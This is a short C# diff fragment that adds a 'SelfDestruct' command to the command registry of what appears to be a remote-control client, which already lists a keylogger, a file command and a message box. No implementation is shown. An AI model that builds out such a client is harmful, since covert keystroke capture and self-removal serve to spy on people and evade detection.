@@ -18,6 +18,7 @@ namespace Client.Commands
             this.commands.Add(new File("file"));
             this.commands.Add(new MsgBox("msgbox"));
             this.commands.Add(new keyLogger("keylogger"));
+            this.commands.Add(new SelfDestruct("destroy"));
         }
 
         public string runCommand( string cmd)
